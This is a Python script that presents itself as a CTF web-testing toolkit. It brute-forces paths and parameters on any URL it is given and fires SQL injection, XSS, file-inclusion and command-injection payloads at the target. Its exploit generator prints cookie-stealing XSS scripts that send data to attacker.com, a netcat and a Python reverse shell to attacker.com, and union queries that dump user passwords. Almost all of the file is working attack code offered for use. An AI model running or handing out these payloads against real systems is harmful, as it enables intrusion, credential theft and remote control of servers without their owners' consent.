#!/usr/bin/env python3
"""
CTF Web Application Testing Toolkit
Comprehensive tool for web application penetration testing in CTF scenarios
"""

import requests
import urllib.parse
import threading
import time
import random
import string
import base64
import hashlib
import json
import re
import os
import sys
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import itertools

class Colors:
    """Color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class CTFWebToolkit:
    def __init__(self):
        self.target_url = None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.found_directories = []
        self.found_files = []
        self.vulnerabilities = []
        
    def banner(self):
        """Display the toolkit banner"""
        print(f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                    CTF Web Testing Toolkit                  ║
║              Comprehensive Web App Penetration Tool         ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
        """)

    def set_target(self, url):
        """Set the target URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        self.target_url = url
        print(f"{Colors.GREEN}[+] Target set to: {url}{Colors.END}")

    def reconnaissance(self):
        """Phase 1: Information Gathering"""
        print(f"\n{Colors.BOLD}{Colors.YELLOW}[PHASE 1] RECONNAISSANCE{Colors.END}")
        
        if not self.target_url:
            print(f"{Colors.RED}[-] Please set a target URL first{Colors.END}")
            return
        
        print(f"{Colors.BLUE}[*] Gathering basic information...{Colors.END}")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            print(f"{Colors.GREEN}[+] Status Code: {response.status_code}{Colors.END}")
            print(f"{Colors.GREEN}[+] Server: {response.headers.get('Server', 'Unknown')}{Colors.END}")
            print(f"{Colors.GREEN}[+] Content-Type: {response.headers.get('Content-Type', 'Unknown')}{Colors.END}")
            print(f"{Colors.GREEN}[+] Content-Length: {len(response.content)} bytes{Colors.END}")
            
            # Check for interesting headers
            interesting_headers = ['X-Powered-By', 'X-Frame-Options', 'X-XSS-Protection', 'Content-Security-Policy']
            for header in interesting_headers:
                if header in response.headers:
                    print(f"{Colors.CYAN}[*] {header}: {response.headers[header]}{Colors.END}")
            
            # Technology fingerprinting
            self.fingerprint_technology(response)
            
        except requests.RequestException as e:
            print(f"{Colors.RED}[-] Error connecting to target: {e}{Colors.END}")

    def fingerprint_technology(self, response):
        """Fingerprint web technologies"""
        print(f"\n{Colors.BLUE}[*] Technology Fingerprinting:{Colors.END}")
        
        content = response.text.lower()
        headers = response.headers
        
        # Common technology signatures
        technologies = {
            'PHP': ['x-powered-by: php', 'phpsessid', '<?php'],
            'Apache': ['server: apache', 'apache/'],
            'Nginx': ['server: nginx'],
            'WordPress': ['wp-content', 'wp-includes', '/wp-admin/'],
            'jQuery': ['jquery', 'jquery.min.js'],
            'Bootstrap': ['bootstrap', 'bootstrap.min.css'],
            'MySQL': ['mysql', 'mysqli'],
            'Python': ['python', 'django', 'flask'],
            'Node.js': ['express', 'node.js'],
            'ASP.NET': ['asp.net', 'aspx', 'viewstate']
        }
        
        for tech, signatures in technologies.items():
            for sig in signatures:
                if sig in content or any(sig in str(v).lower() for v in headers.values()):
                    print(f"{Colors.GREEN}[+] Detected: {tech}{Colors.END}")
                    break

    def directory_enumeration(self):
        """Phase 2: Directory and File Discovery"""
        print(f"\n{Colors.BOLD}{Colors.YELLOW}[PHASE 2] DIRECTORY ENUMERATION{Colors.END}")
        
        if not self.target_url:
            print(f"{Colors.RED}[-] Please set a target URL first{Colors.END}")
            return
        
        # Common directories and files for web apps
        wordlists = {
            'directories': [
                'admin', 'administrator', 'login', 'wp-admin', 'phpmyadmin',
                'backup', 'backups', 'uploads', 'images', 'img', 'css', 'js',
                'includes', 'inc', 'config', 'conf', 'api', 'v1', 'v2',
                'test', 'testing', 'dev', 'development', 'staging', 'prod',
                'database', 'db', 'sql', 'logs', 'log', 'tmp', 'temp',
                'assets', 'static', 'public', 'private', 'secret', 'hidden',
                'dashboard', 'panel', 'control', 'manage', 'management'
            ],
            'files': [
                'index.php', 'index.html', 'index.htm', 'admin.php', 'login.php',
                'config.php', 'database.php', 'db.php', 'connect.php',
                'robots.txt', 'sitemap.xml', '.htaccess', 'web.config',
                'backup.sql', 'dump.sql', 'database.sql', 'db_backup.sql',
                'readme.txt', 'changelog.txt', 'todo.txt', 'info.php',
                'phpinfo.php', 'test.php', 'debug.php', 'error.log',
                'access.log', '.env', '.git/config', '.svn/entries'
            ]
        }
        
        print(f"{Colors.BLUE}[*] Starting directory enumeration...{Colors.END}")
        self.bruteforce_paths(wordlists['directories'], 'directory')
        
        print(f"{Colors.BLUE}[*] Starting file enumeration...{Colors.END}")
        self.bruteforce_paths(wordlists['files'], 'file')

    def bruteforce_paths(self, wordlist, path_type):
        """Bruteforce directories and files"""
        found_paths = []
        
        def check_path(path):
            url = urljoin(self.target_url, path)
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code in [200, 301, 302, 403]:
                    return (path, response.status_code, len(response.content))
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(check_path, path): path for path in wordlist}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    path, status_code, content_length = result
                    found_paths.append(result)
                    
                    color = Colors.GREEN if status_code == 200 else Colors.YELLOW
                    print(f"{color}[+] Found {path_type}: {path} (Status: {status_code}, Size: {content_length}){Colors.END}")
        
        if path_type == 'directory':
            self.found_directories = found_paths
        else:
            self.found_files = found_paths

    def parameter_discovery(self):
        """Phase 3: Parameter Discovery"""
        print(f"\n{Colors.BOLD}{Colors.YELLOW}[PHASE 3] PARAMETER DISCOVERY{Colors.END}")
        
        if not self.target_url:
            print(f"{Colors.RED}[-] Please set a target URL first{Colors.END}")
            return
        
        common_params = [
            'id', 'user', 'username', 'email', 'password', 'pass', 'pwd',
            'page', 'file', 'path', 'url', 'redirect', 'return', 'callback',
            'q', 'query', 'search', 'keyword', 'term', 'data', 'input',
            'cmd', 'command', 'exec', 'system', 'shell', 'debug', 'test',
            'admin', 'action', 'method', 'function', 'mode', 'type',
            'cat', 'category', 'sort', 'order', 'limit', 'offset'
        ]
        
        print(f"{Colors.BLUE}[*] Testing for common parameters...{Colors.END}")
        
        def test_parameter(param):
            test_url = f"{self.target_url}?{param}=test"
            try:
                response = self.session.get(test_url, timeout=5)
                baseline_response = self.session.get(self.target_url, timeout=5)
                
                if (response.status_code != baseline_response.status_code or 
                    len(response.content) != len(baseline_response.content)):
                    return param
            except:
                pass
            return None
        
        found_params = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(test_parameter, param): param for param in common_params}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_params.append(result)
                    print(f"{Colors.GREEN}[+] Found parameter: {result}{Colors.END}")
        
        return found_params

    def vulnerability_scanner(self):
        """Phase 4: Vulnerability Scanning"""
        print(f"\n{Colors.BOLD}{Colors.YELLOW}[PHASE 4] VULNERABILITY SCANNING{Colors.END}")
        
        if not self.target_url:
            print(f"{Colors.RED}[-] Please set a target URL first{Colors.END}")
            return
        
        self.test_sql_injection()
        self.test_xss()
        self.test_lfi()
        self.test_command_injection()
        self.test_directory_traversal()

    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print(f"\n{Colors.BLUE}[*] Testing for SQL Injection...{Colors.END}")
        
        sql_payloads = [
            "'", '"', "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
            "admin'--", "admin'#", "' OR 1=1#", "1' OR '1'='1'--",
            "' OR 'x'='x", "1; SELECT * FROM users--"
        ]
        
        # Test on found parameters or common ones
        test_params = ['id', 'user', 'search', 'q']
        
        for param in test_params:
            for payload in sql_payloads:
                test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for SQL error messages
                    sql_errors = [
                        'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                        'ORA-01756', 'Microsoft OLE DB Provider for ODBC Drivers',
                        'PostgreSQL query failed', 'Warning: pg_',
                        'SQLite/JDBCDriver', 'SQLiteException'
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vuln = f"SQL Injection: {param} parameter with payload: {payload}"
                            self.vulnerabilities.append(vuln)
                            print(f"{Colors.RED}[!] VULNERABILITY: {vuln}{Colors.END}")
                            break
                            
                except:
                    continue

    def test_xss(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        print(f"\n{Colors.BLUE}[*] Testing for XSS...{Colors.END}")
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>'
        ]
        
        test_params = ['search', 'q', 'query', 'input', 'data']
        
        for param in test_params:
            for payload in xss_payloads:
                test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    if payload in response.text or payload.replace('"', '&quot;') in response.text:
                        vuln = f"XSS: {param} parameter with payload: {payload}"
                        self.vulnerabilities.append(vuln)
                        print(f"{Colors.RED}[!] VULNERABILITY: {vuln}{Colors.END}")
                        
                except:
                    continue

    def test_lfi(self):
        """Test for Local File Inclusion vulnerabilities"""
        print(f"\n{Colors.BLUE}[*] Testing for Local File Inclusion...{Colors.END}")
        
        lfi_payloads = [
            '../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../../etc/passwd', '/etc/passwd', 'C:\\windows\\system32\\drivers\\etc\\hosts',
            '../../../var/log/apache/access.log', '../../../proc/self/environ'
        ]
        
        test_params = ['file', 'page', 'path', 'include', 'template']
        
        for param in test_params:
            for payload in lfi_payloads:
                test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for file inclusion indicators
                    lfi_indicators = ['root:x:', 'daemon:', 'bin:', '[boot loader]', 'localhost']
                    
                    for indicator in lfi_indicators:
                        if indicator in response.text.lower():
                            vuln = f"LFI: {param} parameter with payload: {payload}"
                            self.vulnerabilities.append(vuln)
                            print(f"{Colors.RED}[!] VULNERABILITY: {vuln}{Colors.END}")
                            break
                            
                except:
                    continue

    def test_command_injection(self):
        """Test for Command Injection vulnerabilities"""
        print(f"\n{Colors.BLUE}[*] Testing for Command Injection...{Colors.END}")
        
        cmd_payloads = [
            '; ls', '| ls', '&& ls', '|| ls', '`ls`', '$(ls)',
            '; id', '| id', '&& id', '|| id', '`id`', '$(id)',
            '; whoami', '| whoami', '&& whoami'
        ]
        
        test_params = ['cmd', 'command', 'exec', 'system', 'run']
        
        for param in test_params:
            for payload in cmd_payloads:
                test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for command execution indicators
                    cmd_indicators = ['uid=', 'gid=', 'groups=', 'total ', 'drwx', '-rw-']
                    
                    for indicator in cmd_indicators:
                        if indicator in response.text:
                            vuln = f"Command Injection: {param} parameter with payload: {payload}"
                            self.vulnerabilities.append(vuln)
                            print(f"{Colors.RED}[!] VULNERABILITY: {vuln}{Colors.END}")
                            break
                            
                except:
                    continue

    def test_directory_traversal(self):
        """Test for Directory Traversal vulnerabilities"""
        print(f"\n{Colors.BLUE}[*] Testing for Directory Traversal...{Colors.END}")
        
        traversal_payloads = [
            '../', '..\\', '....//....//....//....//etc/passwd',
            '%2e%2e%2f', '%2e%2e\\', '..%2f', '..%5c',
            '....//....//....//....//windows/system32/drivers/etc/hosts'
        ]
        
        test_params = ['file', 'path', 'dir', 'folder', 'document']
        
        for param in test_params:
            for payload in traversal_payloads:
                test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for successful traversal
                    if 'root:x:' in response.text or '[boot loader]' in response.text:
                        vuln = f"Directory Traversal: {param} parameter with payload: {payload}"
                        self.vulnerabilities.append(vuln)
                        print(f"{Colors.RED}[!] VULNERABILITY: {vuln}{Colors.END}")
                        
                except:
                    continue

    def exploit_generator(self):
        """Phase 5: Generate Exploits"""
        print(f"\n{Colors.BOLD}{Colors.YELLOW}[PHASE 5] EXPLOIT GENERATION{Colors.END}")
        
        if not self.vulnerabilities:
            print(f"{Colors.YELLOW}[-] No vulnerabilities found to generate exploits for{Colors.END}")
            return
        
        print(f"{Colors.GREEN}[+] Generating exploits for found vulnerabilities...{Colors.END}")
        
        for vuln in self.vulnerabilities:
            print(f"\n{Colors.CYAN}[*] Vulnerability: {vuln}{Colors.END}")
            
            if 'SQL Injection' in vuln:
                self.generate_sql_exploit(vuln)
            elif 'XSS' in vuln:
                self.generate_xss_exploit(vuln)
            elif 'LFI' in vuln:
                self.generate_lfi_exploit(vuln)
            elif 'Command Injection' in vuln:
                self.generate_cmd_exploit(vuln)

    def generate_sql_exploit(self, vuln):
        """Generate SQL injection exploit"""
        print(f"{Colors.YELLOW}[*] SQL Injection Exploit Options:{Colors.END}")
        print("1. Extract database version")
        print("2. Extract table names")
        print("3. Extract user data")
        print("4. Union-based exploitation")
        
        exploits = {
            'version': "' UNION SELECT VERSION()--",
            'tables': "' UNION SELECT table_name FROM information_schema.tables--",
            'users': "' UNION SELECT username,password FROM users--",
            'union': "' UNION SELECT 1,2,3,4,5--"
        }
        
        for name, payload in exploits.items():
            print(f"{Colors.GREEN}[+] {name.capitalize()}: {payload}{Colors.END}")

    def generate_xss_exploit(self, vuln):
        """Generate XSS exploit"""
        print(f"{Colors.YELLOW}[*] XSS Exploit Payloads:{Colors.END}")
        
        exploits = [
            '<script>document.location="http://attacker.com/steal.php?cookie="+document.cookie</script>',
            '<script>fetch("http://attacker.com/steal.php?data="+btoa(document.documentElement.innerHTML))</script>',
            '<script>new Image().src="http://attacker.com/keylog.php?keys="+escape(document.cookie)</script>'
        ]
        
        for i, payload in enumerate(exploits, 1):
            print(f"{Colors.GREEN}[+] Payload {i}: {payload}{Colors.END}")

    def generate_lfi_exploit(self, vuln):
        """Generate LFI exploit"""
        print(f"{Colors.YELLOW}[*] LFI Exploitation Targets:{Colors.END}")
        
        targets = [
            '/etc/passwd - User accounts',
            '/etc/shadow - Password hashes',
            '/var/log/apache2/access.log - Log poisoning',
            '/proc/self/environ - Environment variables',
            '/var/www/html/config.php - Application config'
        ]
        
        for target in targets:
            print(f"{Colors.GREEN}[+] {target}{Colors.END}")

    def generate_cmd_exploit(self, vuln):
        """Generate command injection exploit"""
        print(f"{Colors.YELLOW}[*] Command Injection Payloads:{Colors.END}")
        
        payloads = [
            '; cat /etc/passwd',
            '; nc -e /bin/sh attacker.com 4444',
            '; python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"'
        ]
        
        for payload in payloads:
            print(f"{Colors.GREEN}[+] {payload}{Colors.END}")

    def generate_report(self):
        """Generate a comprehensive report"""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}[REPORT] SCAN SUMMARY{Colors.END}")
        print("="*60)
        
        print(f"\n{Colors.BOLD}Target:{Colors.END} {self.target_url}")
        print(f"{Colors.BOLD}Scan Date:{Colors.END} {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        print(f"\n{Colors.BOLD}Discovered Directories: {len(self.found_directories)}{Colors.END}")
        for path, status, size in self.found_directories[:10]:  # Show first 10
            print(f"  - {path} (Status: {status}, Size: {size})")
        
        print(f"\n{Colors.BOLD}Discovered Files: {len(self.found_files)}{Colors.END}")
        for path, status, size in self.found_files[:10]:  # Show first 10
            print(f"  - {path} (Status: {status}, Size: {size})")
        
        print(f"\n{Colors.BOLD}Vulnerabilities Found: {len(self.vulnerabilities)}{Colors.END}")
        for vuln in self.vulnerabilities:
            print(f"  {Colors.RED}[!] {vuln}{Colors.END}")
        
        # Save report to file
        report_file = f"ctf_scan_report_{int(time.time())}.txt"
        with open(report_file, 'w') as f:
            f.write(f"CTF Web Application Scan Report\n")
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write(f"Directories Found:\n")
            for path, status, size in self.found_directories:
                f.write(f"  - {path} (Status: {status}, Size: {size})\n")
            
            f.write(f"\nFiles Found:\n")
            for path, status, size in self.found_files:
                f.write(f"  - {path} (Status: {status}, Size: {size})\n")
            
            f.write(f"\nVulnerabilities:\n")
            for vuln in self.vulnerabilities:
                f.write(f"  - {vuln}\n")
        
        print(f"\n{Colors.GREEN}[+] Report saved to: {report_file}{Colors.END}")

    def custom_payload_tester(self):
        """Test custom payloads"""
        print(f"\n{Colors.BOLD}{Colors.YELLOW}[CUSTOM] PAYLOAD TESTER{Colors.END}")
        
        if not self.target_url:
            print(f"{Colors.RED}[-] Please set a target URL first{Colors.END}")
            return
        
        print(f"{Colors.BLUE}[*] Enter your custom payload (or 'quit' to exit):{Colors.END}")
        
        while True:
            payload = input(f"{Colors.CYAN}Payload> {Colors.END}").strip()
            if payload.lower() == 'quit':
                break
            
            param = input(f"{Colors.CYAN}Parameter (default: 'id')> {Colors.END}").strip() or 'id'
            test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                print(f"{Colors.GREEN}[+] Status: {response.status_code}{Colors.END}")
                print(f"{Colors.GREEN}[+] Response Length: {len(response.content)}{Colors.END}")
                
                # Show first 500 chars of response
                preview = response.text[:500]
                if len(response.text) > 500:
                    preview += "..."
                print(f"{Colors.YELLOW}[*] Response Preview:{Colors.END}\n{preview}")
                
            except Exception as e:
                print(f"{Colors.RED}[-] Error: {e}{Colors.END}")

    def interactive_menu(self):
        """Main interactive menu"""
        self.banner()
        
        while True:
            print(f"\n{Colors.BOLD}{Colors.CYAN}[MENU] CTF Web Testing Toolkit{Colors.END}")
            print("="*40)
            print("0. Set Target URL")
            print("1. Reconnaissance")
            print("2. Directory Enumeration") 
            print("3. Parameter Discovery")
            print("4. Vulnerability Scanner")
            print("5. Exploit Generator")
            print("6. Custom Payload Tester")
            print("7. Generate Report")
            print("8. Full Automated Scan")
            print("9. Exit")
            
            choice = input(f"\n{Colors.YELLOW}Select option (0-9): {Colors.END}").strip()
            
            if choice == '0':
                url = input(f"{Colors.CYAN}Enter target URL: {Colors.END}").strip()
                self.set_target(url)
                
            elif choice == '1':
                self.reconnaissance()
                
            elif choice == '2':
                self.directory_enumeration()
                
            elif choice == '3':
                self.parameter_discovery()
                
            elif choice == '4':
                self.vulnerability_scanner()
                
            elif choice == '5':
                self.exploit_generator()
                
            elif choice == '6':
                self.custom_payload_tester()
                
            elif choice == '7':
                self.generate_report()
                
            elif choice == '8':
                if not self.target_url:
                    url = input(f"{Colors.CYAN}Enter target URL: {Colors.END}").strip()
                    self.set_target(url)
                
                print(f"\n{Colors.BOLD}{Colors.GREEN}[AUTO] Starting full automated scan...{Colors.END}")
                self.reconnaissance()
                self.directory_enumeration()
                self.parameter_discovery()
                self.vulnerability_scanner()
                self.exploit_generator()
                self.generate_report()
                
            elif choice == '9':
                print(f"{Colors.GREEN}[+] Thanks for using CTF Web Testing Toolkit!{Colors.END}")
                break
                
            else:
                print(f"{Colors.RED}[-] Invalid option. Please try again.{Colors.END}")

def main():
    """Main function"""
    toolkit = CTFWebToolkit()
    
    # Check if URL provided as command line argument
    if len(sys.argv) > 1:
        toolkit.set_target(sys.argv[1])
    
    toolkit.interactive_menu()

if __name__ == "__main__":
    main()